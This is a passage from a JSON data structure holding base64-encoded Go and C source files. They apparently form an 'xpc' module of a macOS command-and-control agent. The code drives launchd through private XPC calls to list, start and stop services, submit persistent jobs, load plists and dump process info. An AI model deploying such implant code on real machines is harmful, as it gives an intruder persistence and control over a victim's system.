HV1aWRfdCAqIHB0cl90b191dWlkX3Q7CnR5cGVkZWYgdW5zaWduZWQgY2hhciAqIHB0cl90b191dWlkX3Q7CmV4dGVybiBjb25zdCBwdHJfdG9fdXVpZF90IHB0cl90b191dWlkKHZvaWQgKnApOwoKI2VuZGlm"
            },
            {
              "xpc_linux.go": "Ly8gK2J1aWxkIGxpbnV4IAoKcGFja2FnZSB4cGMKCmltcG9ydCAoCgkiZXJyb3JzIgopCgoKZnVuYyBydW5Db21tYW5kKGNvbW1hbmQgc3RyaW5nKSAoW11ieXRlLCBlcnJvcikgewoJbiA6PSBtYWtlKFtdYnl0ZSwgMCkKCXJldHVybiBuLCBlcnJvcnMuTmV3KCJub3QgaW1wbGVtZW50ZWQiKQp9"
            },
            {
              "xpc_wrapper_darwin.c": "I2luY2x1ZGUgPGRpc3BhdGNoL2Rpc3BhdGNoLmg+CiNpbmNsdWRlIDxCbG9jay5oPgojaW5jbHVkZSAieHBjX3dyYXBwZXJfZGFyd2luLmgiCiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8b2JqYy9vYmpjLmg+CgoKc3RydWN0IHhwY19nbG9iYWxfZGF0YSB7Cgl1aW50NjRfdAlhOwoJdWludDY0X3QJeHBjX2ZsYWdzOwoJbWFjaF9wb3J0X3QJdGFza19ib290c3RyYXBfcG9ydDsgIAojaWZuZGVmIF82NAoJdWludDMyX3QJcGFkZGluZzsKI2VuZGlmCgl4cGNfb2JqZWN0X3QJeHBjX2Jvb3RzdHJhcF9waXBlOyAKfTsKCiNkZWZpbmUgT1NfQUxMT0NfT05DRV9LRVlfTUFYCTEwMAoKc3RydWN0IF9vc19hbGxvY19vbmNlX3MgewoJbG9uZyBvbmNlOwoJdm9pZCAqcHRyOwp9OwpleHRlcm4gc3RydWN0IF9vc19hbGxvY19vbmNlX3MgX29zX2FsbG9jX29uY2VfdGFibGVbXTsKCnhwY190eXBlX3QgVFlQRV9FUlJPUiA9IFhQQ19UWVBFX0VSUk9SOwp4cGNfdHlwZV90IFRZUEVfQVJSQVkgPSBYUENfVFlQRV9BUlJBWTsKeHBjX3R5cGVfdCBUWVBFX0RBVEEgPSBYUENfVFlQRV9EQVRBOwp4cGNfdHlwZV90IFRZUEVfRElDVCA9IFhQQ19UWVBFX0RJQ1RJT05BUlk7CnhwY190eXBlX3QgVFlQRV9JTlQ2NCA9IFhQQ19UWVBFX0lOVDY0Owp4cGNfdHlwZV90IFRZUEVfU1RSSU5HID0gWFBDX1RZUEVfU1RSSU5HOwp4cGNfdHlwZV90IFRZUEVfVVVJRCA9IFhQQ19UWVBFX1VVSUQ7CnhwY190eXBlX3QgVFlQRV9CT09MID0gWFBDX1RZUEVfQk9PTDsKeHBjX3R5cGVfdCBUWVBFX0RBVEUgPSBYUENfVFlQRV9EQVRFOwp4cGNfdHlwZV90IFRZUEVfRkQgPSBYUENfVFlQRV9GRDsKeHBjX3R5cGVfdCBUWVBFX0NPTk5FQ1RJT04gPSBYUENfVFlQRV9DT05ORUNUSU9OOwp4cGNfdHlwZV90IFRZUEVfTlVMTCA9IFhQQ19UWVBFX05VTEw7CnhwY190eXBlX3QgVFlQRV9TSE1FTSA9IFhQQ19UWVBFX1NITUVNOwoKeHBjX29iamVjdF90IEVSUk9SX0NPTk5FQ1RJT05fSU5WQUxJRCA9ICh4cGNfb2JqZWN0X3QpIFhQQ19FUlJPUl9DT05ORUNUSU9OX0lOVkFMSUQ7CnhwY19vYmplY3RfdCBFUlJPUl9DT05ORUNUSU9OX0lOVEVSUlVQVEVEID0gKHhwY19vYmplY3RfdCkgWFBDX0VSUk9SX0NPTk5FQ1RJT05fSU5URVJSVVBURUQ7CnhwY19vYmplY3RfdCBFUlJPUl9DT05ORUNUSU9OX1RFUk1JTkFURUQgPSAoeHBjX29iamVjdF90KSBYUENfRVJST1JfVEVSTUlOQVRJT05fSU1NSU5FTlQ7Cgpjb25zdCBwdHJfdG9fdXVpZF90IHB0cl90b191dWlkKHZvaWQgKnApIHsgcmV0dXJuIChwdHJfdG9fdXVpZF90KXA7IH0KCgp4cGNfb2JqZWN0X3QgWHBjTGF1bmNoZExpc3RTZXJ2aWNlcyhjaGFyICpTZXJ2aWNlTmFtZSkgewoKICB4cGNfb2JqZWN0X3QgZGljdCA9IHhwY19kaWN0aW9uYXJ5X2NyZWF0ZShOVUxMLCBOVUxMLCAwKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0KGRpY3QsICJzdWJzeXN0ZW0iLCAzKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0KGRpY3QsICJoYW5kbGUiLDApOwogIHhwY19kaWN0aW9uYXJ5X3NldF91aW50NjQoZGljdCwgInJvdXRpbmUiLCBST1VUSU5FX0xJU1QpOwogIHhwY19kaWN0aW9uYXJ5X3NldF91aW50NjQoZGljdCwgInR5cGUiLDEpOwoKICBpZiAoU2VydmljZU5hbWUpCiAgewogICAgeHBjX2RpY3Rpb25hcnlfc2V0X3N0cmluZyhkaWN0LCAibmFtZSIsIFNlcnZpY2VOYW1lKTsKICB9CiAgZWxzZQogIHsKICAgIHhwY19kaWN0aW9uYXJ5X3NldF9ib29sKGRpY3QsICJsZWdhY3kiLCAxKTsKICB9CiAgCiAgeHBjX29iamVjdF90ICpvdXREaWN0ID0gTlVMTDsKICBzdHJ1Y3QgeHBjX2dsb2JhbF9kYXRhICAqeHBjX2dkICA9IChzdHJ1Y3QgeHBjX2dsb2JhbF9kYXRhICopICBfb3NfYWxsb2Nfb25jZV90YWJsZVsxXS5wdHI7CgogIGludCByYyA9IHhwY19waXBlX3JvdXRpbmUgKHhwY19nZC0+eHBjX2Jvb3RzdHJhcF9waXBlLCBkaWN0LCAmb3V0RGljdCk7CiAgCiAgaWYgKG91dERpY3QgIT0gTlVMTCkKICB7CiAgICByZXR1cm4gb3V0RGljdDsKICB9CiAgCiAgeHBjX29iamVjdF90IGVyckRpY3QgPSB4cGNfZGljdGlvbmFyeV9jcmVhdGUoTlVMTCwgTlVMTCwgMCk7CiAgeHBjX2RpY3Rpb25hcnlfc2V0X3N0cmluZyhlcnJEaWN0LCAiZXJyb3IiLCAieHBjX2Jvb3RzdHJhcF9waXBlIHJldHVybmVkIGEgbnVsbCBkaWN0aW9uYXJ5Iik7CgogIHJldHVybiBlcnJEaWN0Owp9Cgp4cGNfb2JqZWN0X3QgWHBjTGF1bmNoZFNlcnZpY2VDb250cm9sKGNoYXIgKlNlcnZpY2VOYW1lLCBpbnQgU3RhcnRTdG9wKSB7CiAgeHBjX29iamVjdF90IGRpY3QgPSB4cGNfZGljdGlvbmFyeV9jcmVhdGUoTlVMTCwgTlVMTCwgMCk7CiAgeHBjX2RpY3Rpb25hcnlfc2V0X3VpbnQ2NCAoZGljdCwgInN1YnN5c3RlbSIsIDMpOyAgICAgICAgICAgICAgIAogIHhwY19kaWN0aW9uYXJ5X3NldF91aW50NjQoZGljdCwgInR5cGUiLDEpOyAgICAgICAgICAgICAgICAgICAgIAogIHhwY19kaWN0aW9uYXJ5X3NldF91aW50NjQoZGljdCwgImhhbmRsZSIsMCk7IAkJICAKICB4cGNfZGljdGlvbmFyeV9zZXRfc3RyaW5nKGRpY3QsICJuYW1lIiwgU2VydmljZU5hbWUpOyAgICAgICAgICAgICAgICAgICAgIAogIHhwY19kaWN0aW9uYXJ5X3NldF9ib29sKGRpY3QsICJsZWdhY3kiLCAxKTsgICAgICAgICAgICAgICAgICAgICAgIAogIHhwY19kaWN0aW9uYXJ5X3NldF91aW50NjQoZGljdCwgInJvdXRpbmUiLCBTdGFydFN0b3AgPyBST1VUSU5FX1NUQVJUIDogUk9VVElORV9TVE9QKTsgICAgIAoKICB4cGNfb2JqZWN0X3QJKm91dERpY3QgPSBOVUxMOwogIHN0cnVjdCB4cGNfZ2xvYmFsX2RhdGEgICp4cGNfZ2QgID0gKHN0cnVjdCB4cGNfZ2xvYmFsX2RhdGEgKikgIF9vc19hbGxvY19vbmNlX3RhYmxlWzFdLnB0cjsKCiAgaW50IHJjID0geHBjX3BpcGVfcm91dGluZSAoeHBjX2dkLT54cGNfYm9vdHN0cmFwX3BpcGUsIGRpY3QsICZvdXREaWN0KTsKCiAgaWYgKG91dERpY3QgIT0gTlVMTCkKICB7CiAgICByZXR1cm4gb3V0RGljdDsKICB9CgogIHhwY19vYmplY3RfdCBlcnJEaWN0ID0geHBjX2RpY3Rpb25hcnlfY3JlYXRlKE5VTEwsIE5VTEwsIDApOwogIHhwY19kaWN0aW9uYXJ5X3NldF9zdHJpbmcoZXJyRGljdCwgImVycm9yIiwgInhwY19ib290c3RyYXBfcGlwZSByZXR1cm5lZCBhIG51bGwgZGljdGlvbmFyeSIpOwoKICByZXR1cm4gZXJyRGljdDsKfQoKeHBjX29iamVjdF90IFhwY0xhdW5jaGRTdWJtaXRKb2IoY2hhciAqUHJvZ3JhbSwgY2hhciAqU2VydmljZU5hbWUsIGludCBLZWVwQWxpdmUpIHsKICB4cGNfb2JqZWN0X3QgZGljdCA9IHhwY19kaWN0aW9uYXJ5X2NyZWF0ZShOVUxMLCBOVUxMLCAwKTsKICB4cGNfb2JqZWN0X3QgcmVxdWVzdCA9IHhwY19kaWN0aW9uYXJ5X2NyZWF0ZShOVUxMLCBOVUxMLCAwKTsKICB4cGNfb2JqZWN0X3Qgc3VibWl0Sm9iID0geHBjX2RpY3Rpb25hcnlfY3JlYXRlKE5VTEwsIE5VTEwsIDApOwoKICB4cGNfZGljdGlvbmFyeV9zZXRfYm9vbChzdWJtaXRKb2IsICJLZWVwQWxpdmUiLCBLZWVwQWxpdmUpOwogIHhwY19kaWN0aW9uYXJ5X3NldF9zdHJpbmcgKHN1Ym1pdEpvYiwgIlByb2dyYW0iLCBQcm9ncmFtKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfc3RyaW5nIChzdWJtaXRKb2IsICJMYWJlbCIsIFNlcnZpY2VOYW1lKTsKCiAgeHBjX29iamVjdF90IHByb2dyYW1Bcmd1bWVudHMgPSB4cGNfYXJyYXlfY3JlYXRlKE5VTEwsIDApOwogIHhwY19kaWN0aW9uYXJ5X3NldF92YWx1ZShzdWJtaXRKb2IsICJQcm9ncmFtQXJndW1lbnRzIiwgcHJvZ3JhbUFyZ3VtZW50cyk7CgogIHhwY19kaWN0aW9uYXJ5X3NldF92YWx1ZSAocmVxdWVzdCwgIlN1Ym1pdEpvYiIsIHN1Ym1pdEpvYik7CiAgeHBjX2RpY3Rpb25hcnlfc2V0X3ZhbHVlIChkaWN0LCAicmVxdWVzdCIsIHJlcXVlc3QpOwogIHhwY19kaWN0aW9uYXJ5X3NldF91aW50NjQgKGRpY3QsICJzdWJzeXN0ZW0iLCA3KTsgICAgICAgICAgICAgIAogIHhwY19kaWN0aW9uYXJ5X3NldF91aW50NjQoZGljdCwgInR5cGUiLDcpOyAgICAgICAgICAgICAgICAgICAgICAKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0KGRpY3QsICJoYW5kbGUiLDApOyAJCSAgCiAgeHBjX2RpY3Rpb25hcnlfc2V0X3VpbnQ2NChkaWN0LCAicm91dGluZSIsIFJPVVRJTkVfU1VCTUlUKTsgICAgICAKCiAgeHBjX29iamVjdF90CSpvdXREaWN0ID0gTlVMTDsKCiAgc3RydWN0IHhwY19nbG9iYWxfZGF0YSAgKnhwY19nZCAgPSAoc3RydWN0IHhwY19nbG9iYWxfZGF0YSAqKSAgX29zX2FsbG9jX29uY2VfdGFibGVbMV0ucHRyOwoKICBpbnQgcmMgPSB4cGNfcGlwZV9yb3V0aW5lKHhwY19nZC0+eHBjX2Jvb3RzdHJhcF9waXBlLCBkaWN0LCAmb3V0RGljdCk7CiAgIAogIGlmIChvdXREaWN0ICE9IE5VTEwpCiAgewogICAgcmV0dXJuIG91dERpY3Q7CiAgfQoKCgogIHhwY19vYmplY3RfdCBlcnJEaWN0ID0geHBjX2RpY3Rpb25hcnlfY3JlYXRlKE5VTEwsIE5VTEwsIDApOwogIHhwY19kaWN0aW9uYXJ5X3NldF9zdHJpbmcoZXJyRGljdCwgImVycm9yIiwgInhwY19ib290c3RyYXBfcGlwZSByZXR1cm5lZCBhIG51bGwgZGljdGlvbmFyeSIpOwoKICByZXR1cm4gZXJyRGljdDsKfQoKeHBjX29iamVjdF90IFhwY0xhdW5jaGRHZXRTZXJ2aWNlU3RhdHVzKGNoYXIgKlNlcnZpY2VOYW1lKSB7CiAgeHBjX29iamVjdF90IGRpY3QgPSB4cGNfZGljdGlvbmFyeV9jcmVhdGUoTlVMTCwgTlVMTCwwKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0IChkaWN0LCAic3Vic3lzdGVtIiwgMyk7ICAgICAgICAgICAgICAgCiAgeHBjX2RpY3Rpb25hcnlfc2V0X3VpbnQ2NChkaWN0LCAidHlwZSIsMSk7ICAgICAgICAgICAgICAgICAgICAgCiAgeHBjX2RpY3Rpb25hcnlfc2V0X3VpbnQ2NChkaWN0LCAiaGFuZGxlIiwwKTsgCQkgICAKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0KGRpY3QsICJyb3V0aW5lIiwgUk9VVElORV9TVEFUVVMpIDsgCiAgeHBjX2RpY3Rpb25hcnlfc2V0X3N0cmluZyAoZGljdCwibmFtZSIsIFNlcnZpY2VOYW1lKTsKCiAgeHBjX29iamVjdF90CSpvdXREaWN0ID0gTlVMTDsKICBzdHJ1Y3QgeHBjX2dsb2JhbF9kYXRhICAqeHBjX2dkICA9IChzdHJ1Y3QgeHBjX2dsb2JhbF9kYXRhICopICBfb3NfYWxsb2Nfb25jZV90YWJsZVsxXS5wdHI7CgogIGludCByYyA9IHhwY19waXBlX3JvdXRpbmUgKHhwY19nZC0+eHBjX2Jvb3RzdHJhcF9waXBlLCBkaWN0LCAmb3V0RGljdCk7CiAgIAogIGlmIChvdXREaWN0ICE9IE5VTEwpCiAgewogICAgcmV0dXJuIG91dERpY3Q7CiAgfQoKCiAgLy8gaWYgd2UgZ2V0IGhlcmUgdGhlcmUgd2FzIGEgcHJvYmxlbQogIHhwY19vYmplY3RfdCBlcnJEaWN0ID0geHBjX2RpY3Rpb25hcnlfY3JlYXRlKE5VTEwsIE5VTEwsIDApOwogIHhwY19kaWN0aW9uYXJ5X3NldF9zdHJpbmcoZXJyRGljdCwgImVycm9yIiwgInhwY19ib290c3RyYXBfcGlwZSByZXR1cm5lZCBhIG51bGwgZGljdGlvbmFyeSIpOwoKICByZXR1cm4gZXJyRGljdDsKfQoKY2hhciogWHBjTGF1bmNoZEdldFByb2NJbmZvKHVuc2lnbmVkIGxvbmcgcGlkKSB7CiAgY2hhciAqcG9pbnRlcjsKICBpbnQgcmV0OwogIHBvaW50ZXIgPSB0bXBuYW0oTlVMTCk7CiAgaW50IGZkID0gb3Blbihwb2ludGVyLCBPX1dST05MWSB8IE9fQ1JFQVQgfCAgT19UUlVOQywKICAgIFNfSVJVU1IgfCBTX0lXVVNSIHwgU19JUkdSUCB8IFNfSVJPVEgpOwogIC8vaW50IGZkID0gZmlsZW5vKHRtcCk7CiAgeHBjX29iamVjdF90IGRpY3QgPSB4cGNfZGljdGlvbmFyeV9jcmVhdGUoTlVMTCwgTlVMTCwgMCk7CiAgeHBjX2RpY3Rpb25hcnlfc2V0X3VpbnQ2NChkaWN0LCAicm91dGluZSIsUk9VVElORV9EVU1QX1BST0NFU1MpOyAKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0IChkaWN0LCAic3Vic3lzdGVtIiwgMik7IAogIHhwY19kaWN0aW9uYXJ5X3NldF9mZChkaWN0LCAiZmQiLGZkKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogIHhwY19kaWN0aW9uYXJ5X3NldF9pbnQ2NChkaWN0LCAicGlkIixwaWQpOyAgICAgICAgICAgICAgICAgICAgICAgCiAgeHBjX29iamVjdF90CSpvdXREaWN0ID0gTlVMTDsKCiAgc3RydWN0IHhwY19nbG9iYWxfZGF0YSAgKnhwY19nZCAgPSAoc3RydWN0IHhwY19nbG9iYWxfZGF0YSAqKSAgX29zX2FsbG9jX29uY2VfdGFibGVbMV0ucHRyOwoKICBpbnQgcmMgPSB4cGNfcGlwZV9yb3V0aW5lICh4cGNfZ2QtPnhwY19ib290c3RyYXBfcGlwZSwgZGljdCwgJm91dERpY3QpOwogIC8vY2xvc2UoZmQpOwogIHJldHVybiBwb2ludGVyOwp9Cgp4cGNfb2JqZWN0X3QgWHBjTGF1bmNoZExvYWRQbGlzdChjaGFyICpQbGlzdCwgaW50IExlZ2FjeSkgewogIHhwY19vYmplY3RfdCBkaWN0ID0geHBjX2RpY3Rpb25hcnlfY3JlYXRlKE5VTEwsIE5VTEwsIDApOwogIHhwY19vYmplY3RfdCBzID0geHBjX3N0cmluZ19jcmVhdGUoUGxpc3QpOwogIHhwY19vYmplY3RfdCBwYXRocyA9IHhwY19hcnJheV9jcmVhdGUoJnMsIDEpOwogIHhwY19kaWN0aW9uYXJ5X3NldF92YWx1ZShkaWN0LCAicGF0aHMiLCBwYXRocyk7CgogIHhwY19kaWN0aW9uYXJ5X3NldF91aW50NjQgKGRpY3QsICJzdWJzeXN0ZW0iLCAzKTsgICAgICAgICAgICAgIAogIHhwY19kaWN0aW9uYXJ5X3NldF9ib29sKGRpY3QsICJlbmFibGUiLCB0cnVlKTsKCWlmIChMZWdhY3kpIHhwY19kaWN0aW9uYXJ5X3NldF9ib29sKGRpY3QsICJsZWdhY3kiLCB0cnVlKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfYm9vbChkaWN0LCAibGVnYWN5LWxvYWQiLCB0cnVlKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0KGRpY3QsICJ0eXBlIiw3KTsgICAgICAgICAgICAgICAgICAgICAKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0KGRpY3QsICJoYW5kbGUiLDApOyAJCSAgIAogIHhwY19kaWN0aW9uYXJ5X3NldF9zdHJpbmcoZGljdCwgInNlc3Npb24iLCAiQXF1YSIpOwogIHhwY19kaWN0aW9uYXJ5X3NldF91aW50NjQoZGljdCwgInJvdXRpbmUiLCBST1VUSU5FX0xPQUQpOwoKICB4cGNfb2JqZWN0X3QJKm91dERpY3QgPSBOVUxMOwogIHN0cnVjdCB4cGNfZ2xvYmFsX2RhdGEgICp4cGNfZ2QgID0gKHN0cnVjdCB4cGNfZ2xvYmFsX2RhdGEgKikgIF9vc19hbGxvY19vbmNlX3RhYmxlWzFdLnB0cjsKCgogIGludCByYyA9IHhwY19waXBlX3JvdXRpbmUoeHBjX2dkLT54cGNfYm9vdHN0cmFwX3BpcGUsIGRpY3QsICZvdXREaWN0KTsKICBpZiAocmMgPT0gMCkgewogICAgaW50IGVyciA9IHhwY19kaWN0aW9uYXJ5X2dldF9pbnQ2NCAob3V0RGljdCwgImVycm9yIik7CiAgICBpZiAoZXJyKSBwcmludGYoIkVycm9yOiAgJWQgLSAlc1xuIiwgZXJyLCB4cGNfc3RyZXJyb3IoZXJyKSk7CiAgICByZXR1cm4gb3V0RGljdDsKICB9CgogIGlmIChvdXREaWN0ICE9IE5VTEwpCiAgewogICAgcmV0dXJuIG91dERpY3Q7CiAgfQoKCiAKICB4cGNfb2JqZWN0X3QgZXJyRGljdCA9IHhwY19kaWN0aW9uYXJ5X2NyZWF0ZShOVUxMLCBOVUxMLCAwKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfc3RyaW5nKGVyckRpY3QsICJlcnJvciIsICJ4cGNfYm9vdHN0cmFwX3BpcGUgcmV0dXJuZWQgYSBudWxsIGRpY3Rpb25hcnkiKTsKCiAgcmV0dXJuIGVyckRpY3Q7Cn0KCnhwY19vYmplY3RfdCBYcGNMYXVuY2hkVW5sb2FkUGxpc3QoY2hhciAqUGxpc3QpIHsKICB4cGNfb2JqZWN0X3QgZGljdCA9IHhwY19kaWN0aW9uYXJ5X2NyZWF0ZShOVUxMLCBOVUxMLCAwKTsKICB4cGNfb2JqZWN0X3QgcyA9IHhwY19zdHJpbmdfY3JlYXRlKFBsaXN0KTsKICB4cGNfb2JqZWN0X3QgcGF0aHMgPSB4cGNfYXJyYXlfY3JlYXRlKCZzLCAxKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfdmFsdWUgKGRpY3QsICJwYXRocyIsIHBhdGhzKTsKCiAgeHBjX2RpY3Rpb25hcnlfc2V0X3VpbnQ2NCAoZGljdCwgInN1YnN5c3RlbSIsIDMpOyAgICAgICAgICAgICAKICB4cGNfZGljdGlvbmFyeV9zZXRfYm9vbChkaWN0LCAiZGlzYWJsZSIsIHRydWUpOwogIHhwY19kaWN0aW9uYXJ5X3NldF9ib29sKGRpY3QsICJsZWdhY3ktbG9hZCIsIHRydWUpOwogIHhwY19kaWN0aW9uYXJ5X3NldF9ib29sKGRpY3QsICJsZWdhY3kiLCB0cnVlKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0KGRpY3QsICJ0eXBlIiw3KTsgICAgICAgICAgICAgICAgICAgICAgCiAgeHBjX2RpY3Rpb25hcnlfc2V0X3VpbnQ2NChkaWN0LCAiaGFuZGxlIiwwKTsgCQkgICAKICB4cGNfZGljdGlvbmFyeV9zZXRfc3RyaW5nKGRpY3QsICJzZXNzaW9uIiwgIkFxdWEiKTsKICB4cGNfZGljdGlvbmFyeV9zZXRfdWludDY0KGRpY3QsICJyb3V0aW5lIiwgUk9VVElORV9VTkxPQUQpOwoKCiAgeHBjX29iamVjdF90CSpvdXREaWN0ID0gTlVMTDsKICBzdHJ1Y3QgeHBjX2dsb2JhbF9kYXRhICAqeHBjX2dkICA9IChzdHJ1Y3QgeHBjX2dsb2JhbF9kYXRhICopICBfb3NfYWxsb2Nfb25jZV90YWJsZVsxXS5wdHI7CgoKICBpbnQgcmMgPSB4cGNfcGlwZV9yb3V0aW5lICh4cGNfZ2QtPnhwY19ib290c3RyYXBfcGlwZSwgZGljdCwgJm91dERpY3QpOwogIGlmIChyYyA9PSAwKSB7CiAgICBpbnQgZXJyID0geHBjX2RpY3Rpb25hcnlfZ2V0X2ludDY0IChvdXREaWN0LCAiZXJyb3IiKTsKICAgIGlmIChlcnIpIHByaW50ZigiRXJyb3I6ICAlZCAtICVzXG4iLCBlcnIsIHhwY19zdHJlcnJvcihlcnIpKTsKICAgIHJldHVybiBvdXREaWN0OwogIH0KCiAgaWYgKG91dERpY3QgIT0gTlVMTCkKICB7CiAgICByZXR1cm4gb3V0RGljdDsKICB9CgoKIAogIHhwY19vYmplY3RfdCBlcnJEaWN0ID0geHBjX2RpY3Rpb25hcnlfY3JlYXRlKE5VTEwsIE5VTEwsIDApOwogIHhwY19kaWN0aW9uYXJ5X3NldF9zdHJpbmcoZXJyRGljdCwgImVycm9yIiwgInhwY19ib290c3RyYXBfcGlwZSByZXR1cm5lZCBhIG51bGwgZGljdGlvbmFyeSIpOwoKICByZXR1cm4gZXJyRGljdDsKfQoKCnhwY19jb25uZWN0aW9uX3QgWHBjQ29ubmVjdChjaGFyICpzZXJ2aWNlLCB1aW50cHRyX3QgY3R4LCBpbnQgcHJpdmlsZWdlZCkgewogICAgZGlzcGF0Y2hfcXVldWVfdCBxdWV1ZSA9IGRpc3BhdGNoX3F1ZXVlX2NyZWF0ZShzZXJ2aWNlLCAwKTsKICAgIHhwY19jb25uZWN0aW9uX3QgY29ubiA9IHhwY19jb25uZWN0aW9uX2NyZWF0ZV9tYWNoX3NlcnZpY2Uoc2VydmljZSwgcXVldWUsIHByaXZpbGVnZWQgPyBYUENfQ09OTkVDVElPTl9NQUNIX1NFUlZJQ0VfUFJJVklMRUdFRDogTlVMTCk7CgogICAgCgogICAgeHBjX2Nvbm5lY3Rpb25fc2V0X2V2ZW50X2hhbmRsZXIoY29ubiwKICAgICAgICBCbG9ja19jb3B5KF4oeHBjX29iamVjdF90IGV2ZW50KSB7CiAgICAgICAgICAgIGhhbmRsZVhwY0V2ZW50KGV2ZW50LCBjdHgpOyAKICAgICAgICB9KQogICAgKTsKCiAgICB4cGNfY29ubmVjdGlvbl9yZXN1bWUoY29ubik7CiAgICByZXR1cm4gY29ubjsKfQoKdm9pZCBYcGNTZW5kTWVzc2FnZSh4cGNfY29ubmVjdGlvbl90IGNvbm4sIHhwY19vYmplY3RfdCBtZXNzYWdlLCBib29sIHJlbGVhc2UsIGJvb2wgcmVwb3J0RGVsaXZlcnkpIHsKICAgIHhwY19jb25uZWN0aW9uX3NlbmRfbWVzc2FnZShjb25uLCAgbWVzc2FnZSk7CiAgICB4cGNfY29ubmVjdGlvbl9zZW5kX2JhcnJpZXIoY29ubiwgXnsKICAgICAgICAKICAgICAgICBpZiAocmVwb3J0RGVsaXZlcnkpIHsgCiAgICAgICAgICAgIHB1dHMoIm1lc3NhZ2UgZGVsaXZlcmVkIik7CiAgICAgICAgfQogICAgfSk7CiAgICBpZiAocmVsZWFzZSkgewogICAgICAgIHhwY19yZWxlYXNlKG1lc3NhZ2UpOwogICAgfQp9Cgp2b2lkIFhwY0FycmF5QXBwbHkodWludHB0cl90IHYsIHhwY19vYmplY3RfdCBhcnIpIHsKICB4cGNfYXJyYXlfYXBwbHkoYXJyLCBeYm9vbChzaXplX3QgaW5kZXgsIHhwY19vYmplY3RfdCB2YWx1ZSkgewogICAgYXJyYXlTZXQodiwgaW5kZXgsIHZhbHVlKTsKICAgIHJldHVybiB0cnVlOwogIH0pOwp9Cgp2b2lkIFhwY0RpY3RBcHBseSh1aW50cHRyX3QgdiwgeHBjX29iamVjdF90IGRpY3QpIHsKICB4cGNfZGljdGlvbmFyeV9hcHBseShkaWN0LCBeYm9vbChjb25zdCBjaGFyICprZXksIHhwY19vYmplY3RfdCB2YWx1ZSkgewogICAgZGljdFNldCh2LCAoY2hhciAqKWtleSwgdmFsdWUpOwogICAgcmV0dXJuIHRydWU7CiAgfSk7Cn0KCnZvaWQgWHBjVVVJREdldEJ5dGVzKHZvaWQgKnYsIHhwY19vYmplY3RfdCB1dWlkKSB7CiAgIGNvbnN0IHVpbnQ4X3QgKnNyYyA9IHhwY191dWlkX2dldF9ieXRlcyh1dWlkKTsKICAgdWludDhfdCAqZGVzdCA9ICh1aW50OF90ICopdjsKCiAgIGZvciAoaW50IGk9MDsgaSA8IHNpemVvZih1dWlkX3QpOyBpKyspIHsKICAgICBkZXN0W2ldID0gc3JjW2ldOwogICB9Cn0="
            },
            {
              "xpc.go": "cGFja2FnZSB4cGMKCmltcG9ydCAoCgkiZW5jb2RpbmcvanNvbiIKCSJzeW5jIgoJInBrZy9wcm9maWxlcyIKCSJwa2cvdXRpbHMvc3RydWN0cyIKKQoKdmFyIG11IHN5bmMuTXV0ZXgKdmFyIHJlc3VsdHMganNvbi5SYXdNZXNzYWdlCnZhciBhcmdzIEFyZ3VtZW50cwoKdHlwZSBBcmd1bWVudHMgc3RydWN0IHsKCUNvbW1hbmQgc3RyaW5nIGBqc29uOiJjb21tYW5kImAKCVNlcnZpY2VOYW1lIHN0cmluZyBganNvbjoic2VydmljZW5hbWUiYAoJUHJvZ3JhbSBzdHJpbmcgYGpzb246InByb2dyYW0iYAoJRmlsZSBzdHJpbmcgYGpzb246ImZpbGUiYAoJS2VlcEFsaXZlIGJvb2wgYGpzb246ImtlZXBhbGl2ZSJgCglQaWQgaW50IGBqc29uOiJwaWQiYAoJRGF0YSBzdHJpbmcgYGpzb246ImRhdGEiYAp9CgpmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaykgewoJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJbXNnLlRhc2tJRCA9IHRhc2suVGFza0lECglhcmdzID0gQXJndW1lbnRze30KCWVyciA6PSBqc29uLlVubWFyc2hhbChbXWJ5dGUodGFzay5QYXJhbXMpLCAmYXJncykKCglpZiBlcnIgIT0gbmlsIHsKCQkKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJcmVzLCBlcnIgOj0gcnVuQ29tbWFuZChhcmdzLkNvbW1hbmQpCgoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCW1zZy5Vc2VyT3V0cHV0ID0gc3RyaW5nKHJlcykKCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgoJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJbXUuTG9jaygpCglwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgltdS5VbmxvY2soKQoJcmV0dXJuCn0="
            },
            {
